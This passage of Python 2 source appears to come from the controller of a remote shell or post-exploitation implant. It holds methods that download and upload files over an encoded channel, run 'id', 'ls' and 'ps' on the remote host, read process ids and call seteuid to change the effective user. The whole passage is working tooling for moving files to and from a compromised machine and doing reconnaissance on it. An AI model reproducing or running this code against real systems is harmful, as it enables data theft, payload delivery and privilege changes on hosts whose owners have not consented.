        data = self.shell.read_until('*')
        n = 0
        try:
            n = int('%s' % data[:-1], 16)
        except:
            f.close()
            self.shell.read_until(self.prompt)
            return 'Download failed (no length, permission denied?)'
        while n:
            c = ''
            data = self.shell.read_until('*')
            try:
                c = self.encoder.decode(data[:-1])
            except:
                f.close()
                data = self.shell.read_until(self.prompt)
                if '****' in data:
                    data = self.encoder.decode(data[data.find('****')+4:-len(self.prompt)])
                    print 'Remote response: %s' % data
                return 'Download failed (bad decode)'
            if c:
                f.write(c)
            n -= len(c)
        f.close()
        data = self.shell.read_until(self.prompt)
        if '****' in data:
            data = self.encoder.decode(data[data.find('****')+4:-len(self.prompt)])
            print 'Remote response: %s' % data
        return 'Downloaded %s into ./download%s' % (src, ts)

    def upload(self, src, dst='.'):
        """Uploads a local file"""
        if dst == '.':
            dst = './' + os.path.split(src)[-1]
        self.shell.write(self.encoder.encode("upload " + dst) + '\n')
        st_size = os.stat(src)[stat.ST_SIZE]
        f = open(src, 'rb')
        self.shell.write(self.encoder.encode('0x%x' % st_size) + '*')
        while True:
            data = f.read(1024)
            print 'Writing %d bytes' % len(data)
            if not data:
                break
            self.shell.write(self.encoder.encode(data) + '*')
        f.close()
        data = self.shell.read_until(self.prompt)
        if '****' in data:
            data = self.encoder.decode(data[data.find('****')+4:-len(self.prompt)])
            print 'Remote response: %s' % data
        return 'Uploaded %s into %s' % (src, dst)
            
    def getids(self):
        """Popen id"""
        return self.cmd("popen id")

    def getpid(self):
        """Get process ID"""
        return self.cmd("getpid")

    def getppid(self):
        """Get parent process ID"""
        return self.cmd("getppid")

    def seteuid(self, euid):
        """Sets effective uid"""
        return self.cmd("seteuid %s" % euid)

    def cd(self, path):
        """Change directory"""
        return self.cmd("chdir "+path)

    def dodir(self, path):
        """Get directory listing"""
        return self.cmd("popen ls -lat '%s'" % path)

    def doprocesslisting(self):
        """Popen ps -aux"""
        return self.cmd("popen ps -aux")

    # deal with unicode etc. inconsistencies on incoming data
    def cmd(self, command):
        self.shell.write(self.encoder.encode(command) + '\n')
        data = self.shell.read_until(self.prompt)
        data = data[:-len(self.prompt)] # nibble off the prompt
        if data.find('****') != -1: # we do this in case python itself is printing stuff on our pipe
            try:
                return self.encoder.decode(data[data.find('****')+4:])
            except:
                print 'XXX: bad decode on %s' % repr(data)
        else:
            return ''

